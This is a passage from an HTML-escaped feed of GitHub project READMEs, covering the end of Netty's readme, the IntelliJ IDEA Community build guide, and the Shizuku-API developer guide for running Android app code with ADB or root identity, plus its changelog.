&lt;p&gt;Development of all versions takes place in each branch whose name is identical to &lt;code&gt;&amp;lt;majorVersion&amp;gt;.&amp;lt;minorVersion&amp;gt;&lt;/code&gt;. For example, the development of 3.9 and 4.1 resides in &lt;a href="https://github.com/netty/netty/tree/3.9"&gt;the branch '3.9'&lt;/a&gt; and &lt;a href="https://github.com/netty/netty/tree/4.1"&gt;the branch '4.1'&lt;/a&gt; respectively.&lt;/p&gt; 
&lt;h2&gt;Usage with JDK 9+&lt;/h2&gt; 
&lt;p&gt;You can read the &lt;a href="https://raw.githubusercontent.com/netty/netty/4.2/testsuite-jpms/README.md"&gt;Modular Netty guide&lt;/a&gt; to learn more about using Netty with the Java Platform Module System, the guide contains a user section and a developer section for Netty contributors.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>JetBrains/intellij-community</title>
      <link>https://github.com/JetBrains/intellij-community</link>
      <description>&lt;p&gt;IntelliJ IDEA Community Edition &amp; IntelliJ Platform&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href="https://github.com/JetBrains/.github/raw/main/profile/README.md"&gt;&lt;img src="http://jb.gg/badges/official.svg?sanitize=true" alt="official JetBrains project"&gt;&lt;/a&gt; &lt;a href="https://github.com/JetBrains/intellij-community/actions/workflows/IntelliJ_IDEA.yml"&gt;&lt;img src="https://github.com/JetBrains/intellij-community/workflows/IntelliJ%20IDEA/badge.svg?sanitize=true" alt="Build status"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;IntelliJ IDEA Community Edition&lt;/h1&gt; 
&lt;p&gt;These instructions will help you build IntelliJ IDEA Community Edition from source code, which is the basis for IntelliJ Platform development. The following conventions will be used to refer to directories on your machine:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;USER_HOME&amp;gt;&lt;/code&gt; is your home directory.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; is the root directory for the IntelliJ source code.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Getting IntelliJ IDEA Community Edition Source Code&lt;/h2&gt; 
&lt;p&gt;IntelliJ IDEA Community Edition source code is available from &lt;code&gt;github.com/JetBrains/intellij-community&lt;/code&gt; by either cloning or downloading a zip file (based on a branch) into &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt;. The default is the &lt;em&gt;master&lt;/em&gt; branch.&lt;/p&gt; 
&lt;p&gt;The master branch contains the source code which will be used to create the next major version of IntelliJ IDEA. The branch names and build numbers for older releases of IntelliJ IDEA can be found on the page of &lt;a href="https://plugins.jetbrains.com/docs/intellij/build-number-ranges.html"&gt;Build Number Ranges&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;These Git operations can also be done through the &lt;a href="https://www.jetbrains.com/help/idea/using-git-integration.html"&gt;IntelliJ IDEA user interface&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Speed Tip:&lt;/strong&gt;&lt;/em&gt; If the complete repository history isn't needed, then using a shallow clone (&lt;code&gt;git clone --depth 1&lt;/code&gt;) will save significant time.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;On Windows:&lt;/strong&gt;&lt;/em&gt; Two git options are required to check out sources on Windows. Since it's a common source of Git issues on Windows anyway, those options could be set globally (execute those commands before cloning any of intellij-community/android repositories):&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;git config --global core.longpaths true&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;git config --global core.autocrlf input&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;IntelliJ IDEA Community Edition requires additional Android modules from separate Git repositories. To clone these repositories, run one of the &lt;code&gt;getPlugins&lt;/code&gt; scripts located in the &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory. Use the &lt;code&gt;--shallow&lt;/code&gt; argument if the complete repository history isn't needed. These scripts clone their respective &lt;em&gt;master&lt;/em&gt; branches. Make sure you are inside the &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory when running those scripts, so the modules get cloned inside the &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;getPlugins.sh&lt;/code&gt; for Linux or macOS.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;getPlugins.bat&lt;/code&gt; for Windows.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; Always &lt;code&gt;git checkout&lt;/code&gt; the &lt;code&gt;intellij-community&lt;/code&gt; and &lt;code&gt;android&lt;/code&gt; Git repositories to the same branches/tags.&lt;/p&gt; 
&lt;h2&gt;Building IntelliJ Community Edition&lt;/h2&gt; 
&lt;p&gt;Version 2023.2 or newer of IntelliJ IDEA Community Edition or IntelliJ IDEA Ultimate Edition is required to build and develop for the IntelliJ Platform.&lt;/p&gt; 
&lt;h3&gt;Opening the IntelliJ Source Code for Build&lt;/h3&gt; 
&lt;p&gt;Using IntelliJ IDEA &lt;strong&gt;File | Open&lt;/strong&gt;, select the &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;If IntelliJ IDEA displays an error about a missing or out of date required plugin (e.g. Kotlin), &lt;a href="https://www.jetbrains.com/help/idea/managing-plugins.html"&gt;enable, upgrade, or install that plugin&lt;/a&gt; and restart IntelliJ IDEA.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;IntelliJ Build Configuration&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;It's recommended to use JetBrains Runtime 17 to compile the project. When you invoke &lt;strong&gt;Build Project&lt;/strong&gt; for the first time, IntelliJ IDEA should suggest downloading it automatically.&lt;/li&gt; 
 &lt;li&gt;If the &lt;em&gt;Maven&lt;/em&gt; plugin is disabled, &lt;a href="https://www.jetbrains.com/help/idea/absolute-path-variables.html"&gt;add the path variable&lt;/a&gt; "&lt;strong&gt;MAVEN_REPOSITORY&lt;/strong&gt;" pointing to &lt;code&gt;&amp;lt;USER_HOME&amp;gt;/.m2/repository&lt;/code&gt; directory.&lt;/li&gt; 
 &lt;li&gt;Make sure you have at least 8GB of RAM on your computer. With the bare minimum of RAM, disable "Compile independent modules in parallel" option in &lt;a href="https://www.jetbrains.com/help/idea/specifying-compilation-settings.html"&gt;the compiler settings&lt;/a&gt;. With notably more memory available, increase "User-local build process heap size" to 3000 - that will greatly reduce compilation time.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Note that it is important to use the variant of JetBrains Runtime &lt;strong&gt;without JCEF&lt;/strong&gt;. So, if for some reason &lt;code&gt;jbr-17&lt;/code&gt; SDK points to an installation of JetBrains Runtime with JCEF, you need to change it: ensure that IntelliJ IDEA is running in internal mode (by adding &lt;code&gt;idea.is.internal=true&lt;/code&gt; to &lt;code&gt;idea.properties&lt;/code&gt; file), navigate to &lt;code&gt;jbr-17&lt;/code&gt; item in Project Structure | SDKs, click on 'Browse' button, choose 'Download...' item and select version 17 and vendor 'JetBrains Runtime'.&lt;/p&gt; 
&lt;h3&gt;Building the IntelliJ Application Source Code&lt;/h3&gt; 
&lt;p&gt;To build IntelliJ IDEA Community Edition from source, choose &lt;strong&gt;Build | Build Project&lt;/strong&gt; from the main menu.&lt;/p&gt; 
&lt;p&gt;To build installation packages, run the &lt;code&gt;installers.cmd&lt;/code&gt; command in &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory. &lt;code&gt;installers.cmd&lt;/code&gt; will work on both Windows and Unix systems.&lt;/p&gt; 
&lt;p&gt;Options to build installers are passed as system properties to &lt;code&gt;installers.cmd&lt;/code&gt; command. You may find the list of available properties in &lt;a href="https://raw.githubusercontent.com/JetBrains/intellij-community/master/platform/build-scripts/src/org/jetbrains/intellij/build/BuildOptions.kt"&gt;BuildOptions.kt&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Examples (&lt;code&gt;./&lt;/code&gt; should be added only for Linux/macOS):&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Build installers only for current operating system: &lt;code&gt;./installers.cmd -Dintellij.build.target.os=current&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Build source code &lt;em&gt;incrementally&lt;/em&gt; (do not build what was already built before): &lt;code&gt;./installers.cmd -Dintellij.build.incremental.compilation=true&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;code&gt;installers.cmd&lt;/code&gt; is used just to run &lt;a href="https://raw.githubusercontent.com/JetBrains/intellij-community/master/build/src/OpenSourceCommunityInstallersBuildTarget.kt"&gt;OpenSourceCommunityInstallersBuildTarget&lt;/a&gt; from the command line. You may call it directly from IDEA, see run configuration &lt;code&gt;Build IDEA Community Installers (current OS)&lt;/code&gt; for an example.&lt;/p&gt; 
&lt;h4&gt;Dockerized Build Environment&lt;/h4&gt; 
&lt;p&gt;To build installation packages inside a Docker container with preinstalled dependencies and tools, run the following command in &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory (on Windows, use PowerShell): &lt;code&gt;docker run --rm -it --user "$(id -u)" --volume "${PWD}:/community" "$(docker build --quiet . --target intellij_idea)"&lt;/code&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Please remember to specify the &lt;code&gt;--user "$(id -u)"&lt;/code&gt; argument for the container's user to match the host's user. This is required not to affect the permissions of the checked-out repository, the build output and the mounted Maven cache, if any.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;To reuse the existing Maven cache from the host system, add the following option to &lt;code&gt;docker run&lt;/code&gt; command: &lt;code&gt;--volume "$HOME/.m2:/home/ide_builder/.m2"&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Running IntelliJ IDEA&lt;/h2&gt; 
&lt;p&gt;To run the IntelliJ IDEA built from source, choose &lt;strong&gt;Run | Run&lt;/strong&gt; from the main menu. This will use the preconfigured run configuration "&lt;strong&gt;IDEA&lt;/strong&gt;".&lt;/p&gt; 
&lt;p&gt;To run tests on the build, apply these setting to the &lt;strong&gt;Run | Edit Configurations... | Templates | JUnit&lt;/strong&gt; configuration tab:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Working dir: &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;/bin&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;VM options: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;-ea&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can find other helpful information at &lt;a href="https://www.jetbrains.com/opensource/idea"&gt;https://www.jetbrains.com/opensource/idea&lt;/a&gt;. The "Contribute Code" section of that site describes how you can contribute to IntelliJ IDEA.&lt;/p&gt; 
&lt;h2&gt;Running IntelliJ IDEA on CI/CD environment&lt;/h2&gt; 
&lt;p&gt;To run tests outside of IntelliJ IDEA, run the &lt;code&gt;tests.cmd&lt;/code&gt; command in &lt;code&gt;&amp;lt;IDEA_HOME&amp;gt;&lt;/code&gt; directory. &lt;code&gt;tests.cmd&lt;/code&gt; will work on both Windows and Unix systems.&lt;/p&gt; 
&lt;p&gt;Options to run tests are passed as system properties to &lt;code&gt;tests.cmd&lt;/code&gt; command. You may find the list of available properties in &lt;a href="https://raw.githubusercontent.com/JetBrains/intellij-community/master/platform/build-scripts/src/org/jetbrains/intellij/build/TestingOptions.kt"&gt;TestingOptions.kt&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Examples (&lt;code&gt;./&lt;/code&gt; should be added only for Linux/macOS):&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Build source code &lt;em&gt;incrementally&lt;/em&gt; (do not build what was already built before): &lt;code&gt;./tests.cmd -Dintellij.build.incremental.compilation=true&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Run a specific test: &lt;code&gt;./tests.cmd -Dintellij.build.test.patterns=com.intellij.util.ArrayUtilTest&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;code&gt;tests.cmd&lt;/code&gt; is used just to run &lt;a href="https://raw.githubusercontent.com/JetBrains/intellij-community/master/build/src/CommunityRunTestsBuildTarget.kt"&gt;CommunityRunTestsBuildTarget&lt;/a&gt; from the command line. You may call it directly from IDEA, see run configuration &lt;code&gt;tests in community&lt;/code&gt; for an example.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>RikkaApps/Shizuku-API</title>
      <link>https://github.com/RikkaApps/Shizuku-API</link>
      <description>&lt;p&gt;The API and the developer guide for Shizuku and Sui.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Shizuku-API&lt;/h1&gt; 
&lt;p&gt;Shizuku API is the API provided by &lt;a href="https://github.com/RikkaApps/Shizuku"&gt;Shizuku&lt;/a&gt; and &lt;a href="https://github.com/RikkaApps/Sui"&gt;Sui&lt;/a&gt;. With Shizuku API, you can call your Java/JNI code with root/shell (ADB) identity.&lt;/p&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;p&gt;To use Shizuku APIs, you need to guide the user to install Shizuku or Sui first. Both of them require Android 6.0+.&lt;/p&gt; 
&lt;h3&gt;Shizuku&lt;/h3&gt; 
&lt;p&gt;Shizuku is a standard Android application. You can guide the users to download Shizuku from &lt;a href="https://shizuku.rikka.app/download/"&gt;https://shizuku.rikka.app/download/&lt;/a&gt;. Shizuku works for both rooted and non-rooted devices.&lt;/p&gt; 
&lt;p&gt;On non-rooted devices, Shizuku needs to be manually restarted with adb every time on boot. Before Android 11, a computer is required to run adb. Android 11 and above have built-in wireless debugging support, and users can start Shizuku directly on the device.&lt;/p&gt; 
&lt;h3&gt;Sui&lt;/h3&gt; 
&lt;p&gt;Sui is a &lt;a href="https://github.com/topjohnwu/Magisk"&gt;Magisk&lt;/a&gt; module. Magisk requires an unlocked bootloader.&lt;/p&gt; 
&lt;p&gt;No additional setup is required except for the installation. You can guide the rooted users (searching &lt;code&gt;su&lt;/code&gt; in &lt;code&gt;PATH&lt;/code&gt; is enough) to download Sui from Magisk or &lt;a href="https://github.com/RikkaApps/Sui"&gt;https://github.com/RikkaApps/Sui&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Demo&lt;/h2&gt; 
&lt;p&gt;A demo project is provided. See &lt;a href="https://github.com/RikkaApps/Shizuku-API/tree/master/demo"&gt;demo&lt;/a&gt; for more.&lt;/p&gt; 
&lt;h2&gt;Guide&lt;/h2&gt; 
&lt;p&gt;I'll say the difficult words first, using Shizuku APIs is similar to framework or system app development, some experience in developing common applications may not be enough. You have to get used to digging into Android source code to find out how things work, &lt;a href="https://cs.android.com"&gt;cs.android.com&lt;/a&gt; and AndroidXref sites will be your best friend.&lt;/p&gt; 
&lt;h3&gt;Add dependency&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://img.shields.io/maven-central/v/dev.rikka.shizuku/api" alt="Maven Central"&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-groovy"&gt;def shizuku_version = (the version above)
implementation "dev.rikka.shizuku:api:$shizuku_version"

// Add this line if you want to support Shizuku
implementation "dev.rikka.shizuku:provider:$shizuku_version"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Acquire the Binder&lt;/h3&gt; 
&lt;p&gt;The first step is to acquire the Binder from Shizuku or Sui.&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;Shizuku&lt;/code&gt; class provides listeners, &lt;code&gt;Shizuku#addBinderReceivedListener()&lt;/code&gt; and &lt;code&gt;Shizuku.addBinderDeadListener()&lt;/code&gt;, that allows you to track the life of the binder. You should call methods in &lt;code&gt;Shizuku&lt;/code&gt; class when the binder is alive or you will get an &lt;code&gt;IllegalStateException&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The steps to get a Binder from Sui and Shizuku are different.&lt;/p&gt; 
&lt;h4&gt;Sui&lt;/h4&gt; 
&lt;p&gt;Call &lt;code&gt;Sui.init(packageName)&lt;/code&gt; before using &lt;code&gt;Shizuku&lt;/code&gt; class. This method only needs to be called once. If this method returns true, means Sui is installed and available.&lt;/p&gt; 
&lt;p&gt;For multi-process applications, call this method in every process that needs to use Shizuku API.&lt;/p&gt; 
&lt;p&gt;Note, request the binder for Sui only requires two times of binder IPC, this is significantly cheaper than initialize Shizuku which uses &lt;code&gt;ContentProvider&lt;/code&gt;. &lt;code&gt;Sui.init(packageName)&lt;/code&gt; can be used in main thread, you don't need to worry about performance.&lt;/p&gt; 
&lt;h4&gt;Shizuku&lt;/h4&gt; 
&lt;p&gt;Add &lt;code&gt;ShizukuProvider&lt;/code&gt; to &lt;code&gt;AndroidManifest.xml&lt;/code&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;provider
    android:name="rikka.shizuku.ShizukuProvider"
    android:authorities="${applicationId}.shizuku"
    android:multiprocess="false"
    android:enabled="true"
    android:exported="true"
    android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" /&amp;gt;

&amp;lt;!-- android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" is to protect this provider from accessing by normal apps --&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For multi-process applications, you need to call &lt;code&gt;ShizukuProvider.enableMultiProcessSupport()&lt;/code&gt; in every process which needs to use Shizuku API.&lt;/p&gt; 
&lt;p&gt;Starting from v12.1.0, Sui is initialized automatically in &lt;code&gt;ShizukuProvider&lt;/code&gt;. You can opt-out this behavior by calling &lt;code&gt;ShizukuProvider#disableAutomaticSuiInitialization()&lt;/code&gt; before &lt;code&gt;ShizukuProvider#onCreate()&lt;/code&gt; is called. Unless there are special reasons, apps that support Shizuku should also support Sui, otherwise it will cause user confusion.&lt;/p&gt; 
&lt;h3&gt;Request permission&lt;/h3&gt; 
&lt;p&gt;Requesting permission is similar to &lt;a href="https://developer.android.com/training/permissions/requesting"&gt;requesting runtime permissions&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;A simple example of requesting permission:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-java"&gt;private void onRequestPermissionsResult(int requestCode, int grantResult) {
    boolean granted = grantResult == PackageManager.PERMISSION_GRANTED;
    // Do stuff based on the result and the request code
}

private final Shizuku.OnRequestPermissionResultListener REQUEST_PERMISSION_RESULT_LISTENER = this::onRequestPermissionsResult;

@Override
protected void onCreate(Bundle savedInstanceState) {
    // ...
    Shizuku.addRequestPermissionResultListener(REQUEST_PERMISSION_RESULT_LISTENER);
    // ...
}

@Override
protected void onDestroy() {
    // ...
    Shizuku.removeRequestPermissionResultListener(REQUEST_PERMISSION_RESULT_LISTENER);
    // ...
}

private boolean checkPermission(int code) {
  if (Shizuku.isPreV11()) {
    // Pre-v11 is unsupported
    return false;
  }

  if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
    // Granted
    return true;
  } else if (Shizuku.shouldShowRequestPermissionRationale()) {
    // Users choose "Deny and don't ask again"
    return false;
  } else {
    // Request the permission
    Shizuku.requestPermission(code);
    return false;
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Differents of the privilege betweent ADB and ROOT&lt;/h3&gt; 
&lt;p&gt;Shizuku can be started with ADB or ROOT, and Sui is a Magisk module, so the privilege could be ADB or ROOT. You can use &lt;code&gt;Shizuku#getUid()&lt;/code&gt; to check your privilege, for ROOT it returns &lt;code&gt;0&lt;/code&gt;, for ADB is &lt;code&gt;2000&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;What ADB can do is significantly different from ROOT:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;In the Android world, the privilege is determined by Android permissions. See &lt;a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/packages/Shell/AndroidManifest.xml"&gt;AndroidManifest of Shell&lt;/a&gt;, all the permission granted to Shell (ADB) are listed here. Be aware, the permission changes under different Android versions.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;In Linux world, the privilege is determined by Shell's uid, capabilities, SELinux context, etc. For example, Shell (ADB) cannot access other apps' data files &lt;code&gt;/data/user/0/&amp;lt;package&amp;gt;&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Remote binder call&lt;/h3&gt; 
&lt;p&gt;This is a relatively simple way, but what you can do is limited to Binder calls. Therefore, this is only suitable for simple applications.&lt;/p&gt; 
&lt;p&gt;Shizuku API provides &lt;code&gt;rikka.shizuku.ShizukuBinderWrapper&lt;/code&gt; class which forward Binder calls to Shizuku service which has ADB or ROOT privilege.&lt;/p&gt; 
&lt;h3&gt;UserService&lt;/h3&gt; 
&lt;p&gt;User Service is like &lt;a href="https://developer.android.com/guide/components/bound-services"&gt;Bound services&lt;/a&gt; which allows you to run Java or native codes (through JNI). The difference is that the service runs in a different process and as the identity (Linux UID) of root (UID 0) or shell (UID 2000, if the backend is Shizuku and user starts Shizuku with adb).&lt;/p&gt; 
&lt;p&gt;There are no restrictions on non-SDK APIs in the user service process. However, the User Service process is not a valid Android application process. Therefore, even if you can acquire a &lt;code&gt;Context&lt;/code&gt; instance, many APIs, such as &lt;code&gt;Context#registerReceiver&lt;/code&gt; and &lt;code&gt;Context#getContentResolver&lt;/code&gt; will not work. You will need to dig into Android source code to find out how things work.&lt;/p&gt; 
&lt;p&gt;Be aware that, to let the service to use the latest code, "Run/Debug configurations" - "Always install with package manager" in Android Studio should be checked.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Start the User Service&lt;/p&gt; &lt;p&gt;Use &lt;code&gt;bindUserService&lt;/code&gt; method. This method has two parameters, &lt;code&gt;UserServiceArgs&lt;/code&gt; and &lt;code&gt;ServiceConnection&lt;/code&gt;.&lt;/p&gt; &lt;p&gt;&lt;code&gt;UserServiceArgs&lt;/code&gt; is like &lt;code&gt;Intent&lt;/code&gt; in Bound services, which decides which service will be started and some options.&lt;/p&gt; &lt;p&gt;&lt;code&gt;ServiceConnection&lt;/code&gt; is same as Bound services, but only &lt;code&gt;onServiceConnected&lt;/code&gt; and &lt;code&gt;onServiceDisconnected&lt;/code&gt; are used.&lt;/p&gt; &lt;p&gt;Unlike Bound service, the service class must implement &lt;code&gt;IBinder&lt;/code&gt; interface. The usual usage is &lt;code&gt;public class YourService extends IYouAidlInterface.Stub&lt;/code&gt;.&lt;/p&gt; &lt;p&gt;The service class can have two constructors, one is default constructor, another is with &lt;code&gt;Context&lt;/code&gt; parameter available from Shizuku v13. Shizuku v13 will try the constructor with &lt;code&gt;Context&lt;/code&gt; parameter first. Older Shizuku will always use the default constructor. Beaware that the &lt;code&gt;Context&lt;/code&gt; does not work as same as &lt;code&gt;Context&lt;/code&gt; in normal Android application. See "Use Android APIs in user service" below.&lt;/p&gt; &lt;p&gt;Shizuku uses &lt;code&gt;tag&lt;/code&gt; from &lt;code&gt;UserServiceArgs&lt;/code&gt; to determine if the User Service is same. If &lt;code&gt;tag&lt;/code&gt; is not set, class name will be uses, but class name is unstable after ProGuard/R8. If &lt;code&gt;version&lt;/code&gt; from &lt;code&gt;UserServiceArgs&lt;/code&gt; mismatches, a new User Service will be start and "destroy" method (see below) will be called for the old.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Stop the User Service&lt;/p&gt; &lt;p&gt;Use &lt;code&gt;unbindUserService&lt;/code&gt; method. However, the user service process will &lt;strong&gt;NOT&lt;/strong&gt; be killed automatically. You need to implement a "destroy" method in your service. The transaction code for that method is &lt;code&gt;16777115&lt;/code&gt; (use &lt;code&gt;16777114&lt;/code&gt; in aidl). In this method, you can do some cleanup jobs and call &lt;code&gt;System.exit()&lt;/code&gt; in the end.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;The use of non-SDK interfaces&lt;/h3&gt; 
&lt;p&gt;For "Remote binder call", as the APIs are accessed from the app's process, you may need to use &lt;a href="https://github.com/LSPosed/AndroidHiddenApiBypass"&gt;AndroidHiddenApiBypass&lt;/a&gt; or any ways you want to bypass restrictions on non-SDK interfaces.&lt;/p&gt; 
&lt;p&gt;We also provides &lt;a href="https://github.com/RikkaApps/HiddenApiRefinePlugin"&gt;HiddenApiRefinePlugin&lt;/a&gt; to help you to programing with hidden APIs conveniently.&lt;/p&gt; 
&lt;h2&gt;Changelog&lt;/h2&gt; 
&lt;h3&gt;13.1.5&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fix &lt;code&gt;ShizukuProvider#requestBinderForNonProviderProcess&lt;/code&gt; crash on Android 14 (for apps targeting Android 14)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.1.4&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Ask the server to remove &lt;code&gt;ShizukuServiceConnection&lt;/code&gt; if the server is new enough&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.1.3&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fix the problem that &lt;code&gt;Shizuku#unbindUserService(remove=false)&lt;/code&gt; does not actually remove the callback&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.1.2&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Avoid the use of &lt;code&gt;CopyOnWriteArrayList#removeIf&lt;/code&gt;, as using it with &lt;code&gt;coreLibraryDesugaring&lt;/code&gt; enabled will crash on Android 8+&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.1.1&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Fix &lt;code&gt;Shizuku#removeXXXListener&lt;/code&gt; will crash on Android 7.1 and earlier versions&lt;/p&gt; &lt;p&gt;This is caused by &lt;code&gt;CopyOnWriteArrayList#removeIf&lt;/code&gt; is not supported (throw an &lt;code&gt;UnsupportedOperationException&lt;/code&gt;) before Android 8.0. Please note, using &lt;code&gt;coreLibraryDesugaring&lt;/code&gt; will NOT fix this issue at least in version &lt;code&gt;2.0.3&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Prepare to remove &lt;code&gt;Shizuku#newProcess&lt;/code&gt;, developers should have to use &lt;code&gt;UserService&lt;/code&gt; instead&lt;/p&gt; &lt;p&gt;First, this is already announced two years ago.&lt;/p&gt; &lt;p&gt;For those who don't understand, &lt;code&gt;UserService&lt;/code&gt; gives the developer the ability to run their own codes in a different process with root or shell privilege. This is much more powerful than just executing a command. &lt;code&gt;UserService&lt;/code&gt; can replace &lt;code&gt;newProcess&lt;/code&gt; in all cases.&lt;/p&gt; &lt;p&gt;Also, &lt;code&gt;newProcess&lt;/code&gt; uses texts to communicate , which is not efficient and unreliable. If there are apps that only uses &lt;code&gt;newProcess&lt;/code&gt; to implement its functions, it loses most of the advantage of using Shizuku.&lt;/p&gt; &lt;p&gt;Finally, &lt;code&gt;newProcess&lt;/code&gt; lacks tty support, it is not possible to implement an interactive shell with it. And we already has &lt;code&gt;rish&lt;/code&gt; that allows users to run an interactive shell with privilege in any terminal app they like.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.1.0&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Breaking change: &lt;a href="https://developer.android.com/studio/write/java8-support#library-desugaring"&gt;desugaring&lt;/a&gt; is required if min API of your app is 23&lt;/li&gt; 
 &lt;li&gt;Listeners now has an optional &lt;code&gt;Handler&lt;/code&gt; parameter that determines which thread will the listener be called from&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;13.0.0&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;The constructor of &lt;code&gt;UserService&lt;/code&gt; can have a &lt;code&gt;Context&lt;/code&gt; parameter which value is the &lt;code&gt;Context&lt;/code&gt; used to create the instance of &lt;code&gt;UserService&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;12.2.0&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fix &lt;code&gt;onServiceDisconnected&lt;/code&gt; is not called if the UserService is stopped by &lt;code&gt;Shizuku#unbindUserService&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;12.1.0&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Automatically initialize Sui if you are using Shizuku&lt;/p&gt; &lt;p&gt;You can opt-out this behavior by calling &lt;code&gt;ShizukuProvider#disableAutomaticSuiInitialization()&lt;/code&gt; before &lt;code&gt;ShizukuProvider#onCreate()&lt;/code&gt; is called&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Added a lot more detailed document for most APIs&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Drop pre-v11 support&lt;/p&gt; &lt;p&gt;You don't need to worry about this problem, just show a "not supported" message if the user really uses pre-v11.&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Sui was born after API v11, Sui users are not affected at all.&lt;/li&gt; 
   &lt;li&gt;For Shizuku, according to Google Play statistics, more than 95% of users are on v11+. Shizuku drops Android 5 support from v5, many of the remaining 5% are such people who are stuck at super old versions.&lt;/li&gt; 
